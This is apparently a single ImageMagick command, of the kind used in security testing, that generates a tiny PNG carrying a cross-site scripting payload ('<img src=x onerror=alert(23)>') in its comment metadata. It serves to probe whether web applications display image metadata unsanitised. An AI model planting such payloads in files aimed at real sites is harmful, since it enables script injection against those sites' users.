convert -comment '<img src=x onerror=alert(23)>' -size 1x1 xc:'#000000' png_comment_xss.png
